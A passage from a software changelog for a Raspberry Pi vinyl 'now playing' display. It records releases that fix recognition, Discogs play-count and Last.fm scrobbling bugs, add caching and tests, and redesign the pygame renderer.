- **Muted-role contrast clamp** (DESIGN.md Full-Opacity Rule): extracted
  `muted` colors are lightened at extraction time until they pass WCAG
  4.5:1 against their album's `bg` (`_ensure_contrast`; cool-dark covers
  like Cavetown's `#0e1a2a` were the hazard case).
- **`display.reduced_motion` config flag**: freezes the status dot pulse
  and the listening spinner — the renderer's translation of the design's
  `prefers-reduced-motion` requirement (pygame has no OS media query).
  Bonus: at steady state with the flag on, the render loop goes fully quiet.

### Changed

- **Status strip** now sits on a solid `surface` background (DESIGN.md §5)
  instead of floating on the gradient; labels are letter-spaced mono.
- **Status dot** follows the spec pulse — opacity 1→0.55 / scale 1→0.9,
  1.6s eased loop with an accent glow halo — replacing the old binary
  on/off color flip every 0.8s.
- **Genre chips** restyled per DESIGN.md §5: transparent background, 1px
  border in accent at ~33% alpha (the JSX `{accent}55`), tracked muted
  text — and capped at 3 chips with a `+N` overflow indicator
  (`_chip_texts`), replacing unlimited rows.
- **Album title** renders in Newsreader Italic at line-height 1.12 and may
  wrap to two lines (previously one hard-clipped DejaVu italic line).
- **PREV/NEXT panel** matches the design: 1px top divider, NEXT column
  right-aligned to the metadata column's right edge, names in Inter Tight
  Medium. The divider deviates from the spec's pure `surface` by blending
  40% toward `muted` — pure surface was invisible on the physical display
  at room distance (product decision).
- **Catalog footer** uses tracked JetBrains Mono.

### Performance

- **Static-frame cache:** the full now-playing frame (gradient, shadow,
  cover, ring, strip, all text) is composed once per (track content,
  palette) onto an offscreen Surface; steady-state frames are one blit plus
  the animated dot, instead of re-rendering every element at 10 fps.
- **Layout computed once** at startup (`self._layout`) instead of once per
  frame (`get_now_playing_layout` was called inside the render hot path).
- **Shared wrap algorithm:** `_wrap_lines()` is now the single source of
  truth for word-wrapping — `_draw_wrapped_text` and `_measure_wrapped_text`
  previously carried duplicate copies that could drift.

### Removed

- `_build_font_cache()` and the four startup font dicts (`_fonts`,
  `_italic_fonts`, `_mono_fonts`, `_bold_fonts`), replaced by the lazy
  role-based `_font()` cache. `_draw_text_clipped()` and `_draw_mono_text()`
  superseded by shrink-to-fit drawing and tracked labels.

### Tests

- 314-test unit suite (+17 in `tests/test_renderer_typography.py`):
  wrap/fit/ellipsize behavior, chip capping, WCAG contrast math and clamp,
  and a full headless `_compose_now_playing` smoke test under SDL's dummy
  video driver.

---

## [1.3.5] — 2026-06-10

**Bug-fix and hardening release — the final-pass audit.** A third
full-codebase review (this time auditing the two previous sweeps' own work)
found one bug dating to v1.0.0, one blind spot in the day-old auto-split,
two robustness gaps, a queue-policy inconsistency, lint, and a cluster of
inaccurate log-string guidance in the Pi setup guide. Test count: 271 → 297,
including the first-ever tests for `capture.py`.

### Fixed

- **The ESC key (or closing the window) left the app running headless**
  (`main.py`).  `DisplayRenderer.run()` exits on ESC/QUIT, but
  `asyncio.gather` waited for ALL three pipeline legs — so capture and
  recognition kept running invisibly, still scrobbling and writing play
  counts with no screen attached, until the process was killed.  The legs
  are now named tasks awaited with
  `asyncio.wait(return_when=FIRST_COMPLETED)`: when ANY leg exits, the rest
  are cancelled and the app shuts down cleanly.  Bonus: an unexpected death
  of any single coroutine now also stops the whole app instead of leaving it
  limping.  Present since v1.0.0; survived two prior review sweeps.

- **The v1.3.4 album-change auto-split missed DB-resolved first records**
  (`src/metadata/models.py`, `src/tracking/listen_tracker.py`).  The split
  compared against the LATCHED `album_release_id`, which only
  collection-owned tracks set.  Sequence: record 1 resolves via the Discogs
  database tier (no latch), its closer plays, record 2 (collection-owned) is
  dropped within 45s → no difference detected → sessions merge → record 2
  latches and is phantom-credited with record 1's completed play at session
  end.  `PlaySession` now tracks `last_release_id` — updated from ANY source
  carrying a release ID — and the split compares against that.  Regression
  tests cover both swap directions.

### Changed

- **Recognition queue now drops the oldest chunk, not the newest**
  (`src/audio/recognizer.py`).  When Shazam lags and the 5-chunk queue
  fills, the incoming chunk used to be discarded while stale audio kept
  being processed first — delaying track-change detection.  The OLDEST
  queued chunk is now evicted instead, matching AudioCapture's block-queue
  policy: recent audio wins.

- **Palette transitions skip when the target is unchanged**
  (`src/display/renderer.py`).  Every track commit notifies the renderer,
  and tracks from the same album share a cover — so each commit restarted
  the 1s palette transition (30 fps cadence + per-frame gradient
  regeneration) lerping a palette to itself.  `_queue_palette()` now returns
  early when the computed target equals the current one.

- **Fractional seconds in config no longer crash capture**
  (`src/audio/capture.py`, `src/audio/chunking.py`).  `chunk_seconds: 7.5`
  previously passed validation and died mid-capture with
  `TypeError: slice indices must be integers` deep in numpy.  Capture now
  coerces frame math to int, and `ChunkAssembler` rejects fractional frame
  counts with a clear message (whole-valued floats are accepted and
  coerced).

- **Lint sweep** — removed every pyflakes-flagged unused import: `Optional`
  in `resolver.py` and `lastfm_client.py`, a vestigial `import pylast`
  inside `love()`, `MetadataSource` in `listen_tracker.py`, three
  method-level `import pygame` statements in renderer methods that no longer
  touch pygame, and stray `pytest`/`call`/`asyncio`/`patch` imports across
  five test files.  The tree is now pyflakes-clean.

### Documentation

- **`docs/pi-setup-guide.md` first-run guidance corrected** — the
  watch-the-logs list told users to look for strings that don't exist
  (`Committed track:`, `RawRecognitionResult`), are DEBUG-only and invisible
  at the default INFO level (`MUSIC_STARTED`, `Found in collection`), or are
  worded wrong (`✅ Scrobbled to Last.fm:` vs the actual
  `Last.fm scrobbled:`).  Rewritten to the real INFO-level lines in the
  order they appear, with a note on enabling DEBUG.  The step-11 timing
  ("within 30–60 seconds") also still reflected the pre-v1.3.3 capture
  gap; corrected to ~25–40s.

### Added

- **`tests/test_capture.py`** (10 tests) — first-ever coverage for
  `capture.py`, made possible by stubbing `sounddevice` into `sys.modules`
  before import (the real module needs PortAudio at import time): device
  matching (substring, case-insensitivity, input-channel filtering,
  multi-match warning, not-found error with available-device list), the
  overlap-misconfiguration guard, and config plumbing.
- **`tests/test_renderer_palette.py`** (6 tests) — headless `_queue_palette`
  coverage: disabled theming, fallback paths, cache hits, the v1.3.5
  same-target skip, and genuine retargets.
- **`tests/test_listen_tracker.py`** (+2), **`tests/test_models.py`** (+3),
  **`tests/test_chunking.py`** (+3), **`tests/test_recognizer.py`** (+2) —
  regression tests for the split blind spot, `last_release_id` semantics,
  integral-frame validation, and the drop-oldest queue policy.

---

## [1.3.4] — 2026-06-10

**Behavior-refinement release — follow-up to the v1.3.3 deep review.** The
design observations deferred from v1.3.3 were decided and implemented: the
play-count gate now matches by tracklist position, sessions auto-split when
records are swapped quickly, side flips no longer banish the now-playing
card, and two pieces of dead code were removed. Test count: 261 → 271.

### Changed

- **`is_last_track` matches by tracklist position, not title**
  (`src/metadata/models.py`).  This property is the sole gate on Discogs
  play-count updates, and title-only matching let any earlier track sharing
  the closer's title (title-track reprises, live sets) set
  `potential_last_track` from side A — a phantom play count if the session
  ended there.  The current entry's position string is now compared to the
  final entry's.  Deliberately conservative residual behavior: an album
  whose GENUINE closer duplicates an earlier title resolves to the first
  occurrence and returns False (a missed count, never a phantom one).

- **Sessions auto-split on mid-session album changes**
  (`src/tracking/listen_tracker.py`).  Swapping records faster than
  `session_end_silence_seconds` (45s) used to merge two albums into one
  `PlaySession` — the release ID stayed latched from record 1, so record
  2's closer could credit record 1 with a play.  `on_track_identified` now
  ends the current session when a confirmed track's `discogs_release_id`
  differs from the latched one (correctly crediting record 1 if its closer
  played) and starts a fresh session.  Reliable because the v1.3.3 album
  cache guarantees consistent release IDs per album within a session;
  FALLBACK tracks (no release ID) never trigger a split.

- **The now-playing card stays up during side flips** (`main.py`).
  `MUSIC_STARTED` now transitions to LISTENING only from IDLE.  Previously
  a side flip dropped the display to the IDENTIFYING spinner for ~25s while
  the first track of side B confirmed; the card now stays on screen showing
  side A's last track and updates in place on the next commit.  Fresh
  sessions (from IDLE) still show the spinner.

### Removed

- **`PlayerStatus.SESSION_ENDED`** (`src/state/player_state.py`,
  `src/display/renderer.py`).  Defined since v1.0.0 but never set by any
  code path — `AudioEvent.SESSION_ENDED` (a different concept) leads to
  `clear()`, which transitions directly to IDLE.  Removed from the enum and
  from the renderer's dispatch; a docstring note explains the history.

- **`ListenTracker.__init__`'s unused `config` parameter**
  (`src/tracking/listen_tracker.py`).  The tracker reads everything it
  needs from the resolver's DiscogsClient.  Call sites in `main.py` and the
  test helpers updated.

### Added

- **`tests/test_listen_tracker.py`** (+6 tests) — album-change auto-split:
  splits on differing release IDs, credits a finished record 1, does NOT
  credit an unfinished record 1, no split on same release / FALLBACK
  metadata / before anything is latched.
- **`tests/test_models.py`** (+4 tests) — position-based `is_last_track`:
  the side-A duplicate-title regression, genuine closers, title
  normalization when locating the entry, unknown titles.

---

## [1.3.3] — 2026-06-10

**Bug-fix and performance release — no new features.** A full-codebase deep
review found one real notification bug, one capture-pipeline design flaw
masquerading as a feature, a Discogs API usage pattern flirting with the rate
limit, two render-loop hot paths doing per-frame work that should have been
cached, and a handful of asyncio hygiene issues. All fixed in one pass.
Test count: 210 → 261 (three new test files plus additions to three existing
ones), including the first-ever tests for `PlayerState`.

### Fixed

- **`PlayerState.set_track()` swallowed every track change after the first**
  (`src/state/player_state.py`).  `set_track()` notified listeners only via
  `set_status(PLAYING)`, which no-ops when the status is already PLAYING —
  so for track 2 onward, `DisplayRenderer._on_state_change()` never fired,
  meaning no cover-art prefetch and no palette transition for any track whose
  cover URL differed from the previous one (fallback-sourced tracks, or
  changing records without a 45s silence gap).  `set_track()` now notifies
  exactly once on every call.  Caught by the new `test_player_state.py` —
  `PlayerState` previously had zero test coverage.

- **"Overlapping" capture chunks actually had a dead gap between them**
  (`src/audio/capture.py`, new `src/audio/chunking.py`).  The capture loop
  recorded a 15s chunk with blocking `sd.rec()`, then slept for
  `chunk_seconds - overlap_seconds` (10s) during which nothing was recorded —
  the documented 5s overlap was in reality a 10s blind spot, delaying
  music/silence transition detection by up to ~25s.  Capture now records
  continuously via `sd.InputStream`; a new pure-numpy `ChunkAssembler` emits
  a 15s window every 10s with a genuine 5s shared region between consecutive
  chunks.  No audio is ever dropped between windows.  Fully unit-tested
  without hardware (`tests/test_chunking.py`).

- **Ctrl+C produced a RuntimeError traceback on every shutdown** (`main.py`).
  The old `shutdown()` cancelled ALL tasks (including `main()` itself) and
  then called `loop.stop()` from inside `asyncio.run()`, which guarantees
  `RuntimeError: Event loop stopped before Future completed`.  Signal
  handlers now simply cancel the gathered pipeline tasks; `main()` unwinds
  through a `finally` block that stops capture and display, and
  `asyncio.run()` exits cleanly.

- **Fire-and-forget `asyncio.create_task()` results were never referenced**
  (`src/tracking/listen_tracker.py`, `src/display/renderer.py`).  asyncio
  holds only weak references to tasks, so a running task can in principle be
  garbage-collected mid-flight — and one of these tasks performs the Discogs
  play-count write.  Both classes now hold strong references in a
  `_bg_tasks` set, discarded via done-callback.

### Changed

- **Album-level metadata cache in `MetadataResolver`**
  (`src/metadata/resolver.py`).  A single Discogs resolve can cost 30+ HTTP
  requests (database search, up to 25 collection-membership checks, release
  + tracklist fetches), and every track on an album repeats the identical
  (artist, album) lookup.  `resolve()` now caches results per normalized
  (artist, album) key — Discogs hits and clean fallbacks alike — cutting
  per-LP API traffic by roughly 90%.  Fallback results are cached only when
  both Discogs tiers completed without raising, so a transient network error
  never pins an album to fallback metadata.  Bounded at 64 albums with
  LRU-style eviction.

- **Discogs 429 rate-limit handling** (`src/metadata/discogs_client.py`).
  All direct REST calls now route through a `_request()` helper that retries
  exactly once on HTTP 429, honoring the server's `Retry-After` header
  (clamped to 30s, defaulting to 2s when absent or unparseable).  Discogs
  allows 60 requests/minute; previously a 429 simply failed the operation.

- **Scaled cover art is now cached** (`src/display/renderer.py`).  The
  render loop re-renders ~10×/second to animate the pulsing dot, and every
  frame re-loaded the cover JPEG from disk and re-`smoothscale`d it — the
  single largest constant CPU cost on the Pi.  `_load_cover()` now caches
  the scaled Surface keyed by (url, w, h) in a 16-entry bounded cache.

- **Gradient background is now cached** (`src/display/renderer.py`).  The
  radial gradient (24 full-screen circle fills) is rendered once per
  (palette, size) onto an offscreen Surface and re-blitted each frame.  It
  only regenerates while a palette transition is actively lerping.  Together
  with the cover cache, steady-state render CPU drops by roughly an order of
  magnitude.

- **Shazam client is now reused across recognitions**
  (`src/audio/recognizer.py`).  `ShazamIOBackend` previously constructed a
  fresh `Shazam()` object (and its internal HTTP machinery) for every chunk,
  several times a minute.  One client is now created lazily on first use and
  reused.

- **`_BoundedCache` extracted as a reusable helper**
  (`src/display/renderer.py`).  The palette, scaled-cover, and gradient
  caches all share one insertion-ordered, LRU-refresh-on-get, size-capped
  implementation (previously inline dict juggling for the palette cache
  only).  Pure Python and unit-tested in `tests/test_renderer_caches.py`.

- **`overlap_seconds >= chunk_seconds` is now rejected at startup**
  (`src/audio/capture.py`).  Previously this misconfiguration was silently
  clamped to a zero-second sleep; it now logs a clear warning and disables
  overlap (the old clamp produced an infinite re-recognition of the same
  audio under the new windowing).

### Added

- **`tests/test_player_state.py`** (9 tests) — first coverage for
  `PlayerState`, including the regression test for the set_track
  notification bug and listener-exception isolation.
- **`tests/test_chunking.py`** (13 tests) — pins the ChunkAssembler
  windowing contract: overlap correctness, no lost audio across block
  boundaries, emitted chunks are independent copies, validation.
- **`tests/test_renderer_caches.py`** (13 tests) — `_BoundedCache` semantics
  (eviction order, LRU refresh, replacement) and the palette color math
  (`_lerp_color`, `_lerp_palette`, `_clamp_luminance`).
- **`tests/test_resolver.py`** (+7 tests) — album-cache behavior: cache hits
  skip Discogs, key normalization, fallback-caching rules, transient-error
  retry, bounded eviction.
- **`tests/test_discogs_client.py`** (+8 tests) — `_request()` rate-limit
  behavior: Retry-After honored/defaulted/capped, single retry only, POST
  routing, end-to-end increment-survives-429.
- **`tests/test_listen_tracker.py`** (+1 test) — `_end_session` task is
  strongly referenced until completion.

---

## [1.3.2] — 2026-05-26

**Bug-fix release — no new features.** Follow-up QA sweep of the v1.3.1
codebase identified four real bugs (including one site the v1.3.1
async-loop migration missed), four documentation inaccuracies, and nine
smaller hardening opportunities. Everything was fixed in a single pass.
Test count: 208 → 210 (two new model-level regression tests).

### Fixed

- **`resolver.py` was missed by the v1.3.1 `get_event_loop()` sweep**
  (`src/metadata/resolver.py`). The v1.3.1 CHANGELOG enumerated four files
  it swept; `resolver.py` was an eighth site that should have been included
  and wasn't.  `MetadataResolver.resolve()` (line 35) still called
  `asyncio.get_event_loop()` from inside a coroutine. Replaced with
  `asyncio.get_running_loop()` to match the rest of the codebase.

- **Dirty-flag clobber froze the pulsing dot and identifying spinner**
  (`src/display/renderer.py`).  The v1.3.1 fix that set
  `self._dirty = True` at the end of `_render_now_playing()` /
  `_render_listening()` was immediately overwritten by `self._dirty = False`
  one line later in the run loop, so the animation only ran during the 1s
  palette transition and then froze.  Reset `_dirty` BEFORE calling
  `_render()`, so the inner code can re-dirty for the next frame.

- **`PlaySession.log_track` latched a release_id without an instance_id**
  (`src/metadata/models.py`).  `DISCOGS_DATABASE` results legitimately have
  `discogs_release_id` set but `discogs_instance_id = None` (the user
  doesn't own that pressing).  The old guard `if release_id is None and
  track.discogs_release_id:` accepted these, which meant `_end_session()`
  later called `increment_play_count(release_id, None)` — building a
  URL ending in `…/instances/None/fields/…` that Discogs guaranteed to
  reject.  Tightened the guard to require BOTH IDs before latching.

- **Misleading test name + assertion in `test_listen_tracker.py`** —
  `test_database_source_without_instance_id_does_not_increment` was named
  as if it asserted the call was suppressed, but the body asserted
  `assert_called_once_with(12345, None)`, documenting the bug instead of
  catching it.  Renamed to
  `test_database_source_without_instance_id_does_not_call_increment` and
  flipped the assertion to `assert_not_called()` for both
  `increment_play_count` and `update_last_played`.

- **Inaccurate `CLAUDE.md` config snippet** — listed `discogs.token` but
  the actual key (used by `README.md`, `config.example.yaml`,
  `docs/architecture.md`, `docs/pi-setup-guide.md`, and the code) is
  `discogs.user_token`.  Corrected and expanded the snippet to include
  the other commonly-needed keys (`play_count_field_name`,
  `scrobble_enabled`, etc.) for accuracy.

- **`CLAUDE.md` `PlaySession` description was out of date** — described
  latching as "first Discogs-sourced track only," which under the new
  tightened rule is misleading.  Updated to spell out that BOTH IDs are
  required to latch, so DB-only results don't pre-empt the slot.

- **Architecture diagram in `docs/architecture.md`** showed
  `LastFmClient.love()` dangling under DisplayRenderer.  Re-grouped it
  under ListenTracker, where it actually runs.

### Added

- **HTTP timeouts on every Discogs API call** (`src/metadata/discogs_client.py`).
  Every `self._session.get` and `self._session.post` now passes
  `timeout=15`.  The high-level `discogs_client.Client` (used for
  `search()` and `release()` calls) gets matching limits via
  `set_timeout(connect=5, read=15)`.  Previously, a flaky CDN connection or
  a hung TCP socket could occupy an executor thread for minutes before the
  OS-level timeout kicked in.

- **Atomic, timeout-aware cover-art download**
  (`src/display/renderer.py`).  Replaced `urllib.request.urlretrieve` with
  a `requests.get(..., timeout=15, stream=True)` flow that writes to a
  `tempfile.NamedTemporaryFile` in the cache directory and then
  `os.replace`s into the final path.  No more half-written cache files
  surviving a network drop or process kill; no more unbounded executor
  thread occupancy.

- **Improved audio-device matching diagnostics**
  (`src/audio/capture.py`).  `_find_device_index` now logs all matching
  candidates when more than one input device matches the configured
  `device_name`, so users with multiple USB audio devices (e.g. UCA222 +
  USB mic) can see which one was picked from the logs.

- **Case- and whitespace-insensitive track comparison**
  (`src/audio/recognizer.py`).  Added a `_same_track` helper that
  `.strip().lower()`s title and artist before comparing.  Shazam
  occasionally returns subtly different formatting for the same track
  between chunks; without normalization those count as a new track and
  trigger an unnecessary re-resolve / re-scrobble.

- **Debug log when a recognition chunk is dropped**
  (`src/audio/recognizer.py`).  `enqueue` used to silently drop chunks
  when the queue was full; now it logs at DEBUG level so a "stopped
  identifying tracks" complaint has a breadcrumb in the journal.

- **Bounded `_palette_cache`** (`src/display/renderer.py`).  Added a
  200-entry LRU-ish cap so the per-cover palette cache can't grow
  unbounded over very long uptimes.  Re-running extraction on a cache
  miss is cheap (~ms per album), so eviction is harmless.

- **Mid-transition palette snap** (`src/display/renderer.py`).  If a new
  track arrives before the previous 1s palette lerp completes,
  `_queue_palette` now snaps `_current_palette` to the currently-rendered
  interpolated value before reassigning the target — so the new lerp
  starts from what the user is *currently seeing* instead of from a
  stale base palette.

- **Adaptive render cadence** (`src/display/renderer.py`).  The run loop
  now sleeps `1/30s` only during a palette transition (smooth lerp); the
  rest of the time it sleeps `1/10s`, plenty for the 0.8s pulsing dot
  but easier on the Pi's CPU.

- **README `venv` step** — added the standard `python3 -m venv venv` +
  activate instructions to the Setup block, matching what
  `docs/pi-setup-guide.md` already recommended.

- **Hardened `sync-version-badge.yml` regex** — replaced `[^-]*` with a
  pattern that survives hyphenated pre-release versions like `1.4.0-rc1`.

- **Two new regression tests in `tests/test_models.py`** covering the
  PlaySession latching tightening:
  - `test_log_track_does_not_latch_database_source_without_instance_id`
  - `test_log_track_database_then_collection_latches_collection_only`

---

## [1.3.1] — 2026-05-25

### Fixed

- **`asyncio.get_event_loop()` deprecated calls** — seven calls to the
  deprecated `asyncio.get_event_loop()` inside coroutines were replaced with
  `asyncio.get_running_loop()` across four files. `get_event_loop()` emits a
  `DeprecationWarning` in Python 3.10+ and raises `RuntimeError` in some
  contexts; `get_running_loop()` is the correct API inside a running event loop
  and raises `RuntimeError` immediately if called outside one, making bugs
  easier to catch.
  - `src/audio/capture.py` — `run()` coroutine (×1)
  - `src/audio/recognizer.py` — `_commit_track()` coroutine (×2, executor call
    for Last.fm scrobble)
  - `src/tracking/listen_tracker.py` — `_end_session()` coroutine (×3, all
    three `run_in_executor` calls for Discogs and Last.fm)
  - `main.py` — `shutdown()` coroutine (×1, `loop.stop()`)

- **ShazamIO album extraction nested-loop break** (`src/audio/recognizer.py`) —
  the `break` inside the inner `metadata` loop only exited the metadata
  iteration, not the outer `sections` loop. On multi-section Shazam responses,
  the code continued iterating through additional sections and could overwrite a
  valid album name with an empty string. Added a guard after the inner loop so
  the outer loop also exits once a non-empty album value is found.

- **Blocking cover-art download in async event loop**
  (`src/display/renderer.py`) — `urllib.request.urlretrieve()` was called
  synchronously inside `_load_cover()`, which runs on the main thread of the
  async event loop. This blocked audio capture, recognition, and all other
  async tasks for the duration of the HTTP download on each new track. Fixed by
  splitting responsibilities: `_load_cover()` now reads only from the disk
  cache and returns `None` immediately on a cache miss; a new
  `_prefetch_cover(url)` async method downloads the file in a thread-pool
  executor (`run_in_executor`) and is scheduled via `asyncio.create_task()`
  from `_on_state_change()`. Cover art loads asynchronously; a brief
  placeholder is shown if the cache miss occurs.

- **Pulsing NOW PLAYING dot froze after ~1 second**
  (`src/display/renderer.py`) — the animated `●` dot in the header strip is
  driven by `time.monotonic()` inside `_render_now_playing()`, but `_dirty`
  was never set to `True` after the initial render, so the render loop went
  idle and the animation froze. Added `self._dirty = True` at the end of
  `_render_now_playing()` to keep the loop re-rendering while the now-playing
  screen is active.

- **Genre chip overflow allowed an extra row** (`src/display/renderer.py`) —
  the bounding-box overflow check in the chip grid renderer used
  `y + chip_h > rect.y + rect.h + chip_h`, which permitted chips to overflow
  by a full `chip_h` before breaking. Changed to `y + chip_h > rect.y + rect.h`
  to clip correctly at the panel boundary.

- **Inconsistent color tuple for NEXT track label**
  (`src/display/renderer.py`) — the NEXT track name was rendered with
  `(*p.text[:3],)` (an unpacked 3-element slice wrapped in a tuple) while the
  PREV track name used `p.text` directly. Both are semantically identical when
  `p.text` is already a 3-tuple, but the NEXT label form was inconsistent and
  fragile if `DisplayPalette.text` were ever changed to a longer tuple. Changed
  to `p.text` to match the PREV label.

- **Wrong Last.fm auth URL in `get_lastfm_session_key.py`** — the help text
  printed at startup referenced `https://www.last.fm/api/accounts`, which
  returns a 404. Corrected to `https://www.last.fm/api/account/create`.

- **Negative sleep duration in `AudioCapture.run()`**
  (`src/audio/capture.py`) — if `overlap_seconds >= chunk_seconds` (a
  pathological but reachable config combination), `chunk_seconds -
  overlap_seconds` is negative and `asyncio.sleep()` raises a `ValueError`.
  The duration is now clamped: `await asyncio.sleep(max(0, chunk_seconds -
  overlap_seconds))`.

---

## [1.3.0] — 2026-05-25

### Added

- **Last.fm scrobbling** — every track confirmed by the recognition loop is
  automatically scrobbled to Last.fm. Scrobbles include artist, title, album,
  and the Unix timestamp of when the track was committed. Enabled via the new
  `lastfm.scrobble_enabled` config key (default `false`).
- **"Loved" mark on album completion** — when `love_on_completion: true` is
  set in config and a full album side plays through (i.e. `potential_last_track`
  fires), the last identified track is marked as Loved on Last.fm. Off by
  default. Failure is non-fatal and logged as a warning.
- **`src/tracking/lastfm_client.py`** — new `LastFmClient` class wrapping
  `pylast`. Synchronous (pylast is synchronous); async callers use
  `run_in_executor`, matching the `DiscogsClient` pattern. Graceful no-op when
  not configured or when pylast is not installed. No exception ever propagates
  out of this module — every failure is caught and returned as `False`.
- **`get_lastfm_session_key.py`** — one-time helper script at the repo root.
  Walks through the Last.fm desktop auth flow (token → browser approval →
  session key), then prints the session key to paste into `config.yaml`. The
  session key does not expire; the script only needs to be run once.
- New `lastfm` section in `config.example.yaml`:
  `scrobble_enabled`, `api_key`, `api_secret`, `session_key`, `love_on_completion`.
- **`pylast>=5.1.0`** added to `requirements.txt`.
- **15 new unit tests** in `tests/test_lastfm_client.py` covering: disabled
  config, missing config section, incomplete credentials, pylast ImportError,
  scrobble happy path, empty album → `None`, scrobble when disabled, scrobble
  exception handling, love happy path, love disabled by config, love when
  client disabled, love exception handling, `enabled` property, `love_on_completion`
  property, and full-credentials → enabled.
  Total unit test count: 193 → 208.

### Changed

- `RecognitionLoop.__init__` — accepts an optional `lastfm: LastFmClient`
  parameter (default `None`; backward-compatible).
- `RecognitionLoop._commit_track()` — records a Unix timestamp before
  resolving metadata, then fires `lastfm.scrobble()` in an executor after
  updating state and tracker. Scrobble failure is caught and logged; it never
  interrupts the main loop.
- `ListenTracker.__init__` — accepts an optional `lastfm: LastFmClient`
  parameter (default `None`; backward-compatible).
- `ListenTracker._end_session()` — after the Discogs Play Count and Last
  Played updates, calls `lastfm.love()` on the last identified track when
  `love_on_completion` is enabled. Independent of Discogs: a Discogs failure
  does not prevent the love call.
- `main.py` — constructs `LastFmClient(config)` at startup and injects it
  into both `ListenTracker` and `RecognitionLoop`.
- Module docstring for `listen_tracker.py` updated to document the Last.fm
  love step in the session-end logic.

---

## [1.2.2] — 2026-05-25

### Fixed

- **Cross-side boundary bug in `prev_track_title` / `next_track_title`** — both
  properties previously searched only within the current side's entries. This
  caused the first track on any non-first side (e.g. B1) to return `None` for
  `prev_track_title` instead of the last track of the preceding side (e.g. A3),
  and the last track on any non-last side (e.g. A3) to return `None` for
  `next_track_title` instead of the first track of the following side (e.g. B1).
  Both properties now fall back to the global tracklist when a side boundary is
  reached, correctly stitching sides together. A track that is genuinely first
  globally still returns `None` for `prev_track_title`; a track that is genuinely
  last globally still returns `None` for `next_track_title`.
- New unit tests cover the fixed behaviour:
  `test_prev_track_cross_side_b1_returns_last_of_a` (B1 prev → A3),
  `test_next_track_cross_side_last_a_returns_first_of_b` (A3 next → B1),
  `test_prev_track_very_first_track_is_none` (A1 has no predecessor),
  and `test_next_track_very_last_track_is_none` (B4 has no successor).
  Several pre-existing boundary tests were renamed for specificity; net
  test count: 192 → 193.

---

## [1.2.1] — 2026-05-25

### Changed

- **Dynamic title push-down layout** — the track title is now the unconstrained
  hero element. Instead of occupying a fixed 170px slot and scaling down when text
  overflows, the title takes as much vertical space as it naturally requires. The
  accent divider, artist name, album title, and genre chip badges then flow
  downward from the title's actual bottom edge. The meta footer and prev/next strip
  remain bottom-anchored and are never displaced.  Font size reduction is a last
  resort, applied only when the title genuinely cannot fit even after the secondary
  block has been pushed as far down as possible (i.e. the full budget is consumed).
- `_draw_wrapped_text()` now returns the actual rendered height in pixels so callers
  can position subsequent elements relative to the measured bottom edge.
- New `_measure_wrapped_text()` helper computes wrapped-text height without drawing,
  using the same word-wrap algorithm as `_draw_wrapped_text()` to ensure consistent
  measurement vs. render output.
- `_draw_genre_chips()` accepts an optional `chips_rect` parameter; when supplied it
  overrides `layout.genre_chips` for positioning, enabling dynamic y-coordinate injection.
- `_build_font_cache()` pre-builds stepped-down bold font variants (4 px steps from
  the default title size down to 18 px) into a new `_bold_fonts` dict, used by
  the title-scaling fallback in `_render_now_playing()`.

---

## [1.2.0] — 2026-05-25

### Added

- **"Museum Card" display redesign** — completely new layout derived from Claude Design
  mockups (DirectionA variant): cover art on the left (~440×440px), text panel on the
  right with a hero-scale track title (72px bold), a short accent divider line, artist
  name (48px), album name (32px italic serif), genre/style chip badges, a compact meta
  footer (year · label · catalog), and a prev/next track strip anchored to the bottom.
  A full-width header strip at the top shows a pulsing NOW PLAYING dot and the current
  side/position indicator (e.g. `SIDE A · 02 OF 03`).
- **Dynamic color theming** — album art is quantized to 8 colors via Pillow on each
  track change; the most vibrant color becomes the `accent`, the dominant color is
  darkened to `bg` and `surface`, and near-white tints produce `text` and `muted`. The
  five-field `DisplayPalette` dataclass carries the resolved theme. Palettes are cached
  per cover-art URL so extraction only runs once per album.
- **Radial gradient background** — concentric-circle approximation of a center-to-edge
  gradient (surface color at center → bg color at edges) rendered each frame during
  palette transitions; no new runtime dependencies (pure pygame).
- **1-second palette lerp transitions** — when a new track arrives, the renderer
  smoothly blends `_current_palette` → `_target_palette` over 1 second using
  `_lerp_color()` / `_lerp_palette()`. The run loop continues re-rendering until the
  transition completes, then returns to dirty-flag mode.
- **Genre/style chip badges** — Discogs `styles` (prepended) plus `genres` rendered as
  pill badges with 1px solid border, configurable padding, gap, and corner radius.
  Chips wrap to a second row when they overflow the panel width.
- **Word-wrapped hero track title** — title text is manually word-wrapped across
  multiple lines at the panel width; line height is 0.98× the font height.
- **Side-awareness properties on `TrackMetadata`** — five new computed properties
  derived from the tracklist: `side_letter` (e.g. `"A"`), `side_position` (1-based
  index within the side), `side_total` (track count for that side), `prev_track_title`,
  and `next_track_title`. All return `None` when the track is not found in the
  tracklist or has a numeric-only position string.
- **`genres` field on `TrackMetadata`** — Discogs `styles` followed by `genres` are
  concatenated into a single `genres: list[str]` field. No new API calls — both fields
  are already present in the release response; only extraction was added.
- **`DisplayPalette` dataclass** and **`FALLBACK_PALETTE`** constant in `models.py` —
  a neutral dark-grey fallback used when cover art is missing or extraction fails.
- **`_SIDE_RE` regex** exported from `models.py` — `r"^([A-Za-z]+)(\d+)$"` — parses
  Discogs position strings (e.g. `"B12"`) into `(side_letter, track_number)`.
- **44 new unit tests** across `test_models.py`, `test_layouts.py`, and
  `test_resolver.py` covering all new properties, layout geometry invariants (bounds,
  ordering, font hierarchy, scaling), and genres passthrough.

### Changed

- `NowPlayingLayout` — entirely new field set: 9 layout rects (`header_strip`,
  `cover_art`, `track_text`, `divider`, `artist_text`, `album_text`, `genre_chips`,
  `meta_text`, `prev_next`), 7 font sizes, and 5 chip geometry constants. The old
  3-column single-line layout is replaced by the Museum Card design.
- `get_now_playing_layout()` — all geometry now scales from a 1024×600 reference;
  cover art forced square via `min(sx, sy)` scaling to prevent distortion at non-16:9
  resolutions.
- `DisplayRenderer` — complete rewrite: three font dicts (`_fonts`, `_italic_fonts`,
  `_mono_fonts`) built at startup; dynamic palette fields wired into every draw call;
  radial gradient replaces solid fill; six new private draw methods.
- `DiscogsClient._build_result()` — now extracts `release.styles` (prepended) and
  `release.genres` into a combined `genres` list in the return dict.
- `MetadataResolver._from_discogs()` — passes `genres` through to `TrackMetadata`.
- Total unit test count: 148 → 192.

---

## [1.1.0] — 2026-05-24

### Added

- **Last Played date tracking** — on album completion, `DiscogsClient.update_last_played()`
  writes today's date (ISO 8601, `YYYY-MM-DD`) to a configurable "Last Played" custom
  field in the user's Discogs collection. The field is optional: if
  `discogs.last_played_field_name` is not set in `config.yaml`, the method is a
  graceful no-op and no API calls are made.
- `config.example.yaml` — added optional `last_played_field_name` key (commented out
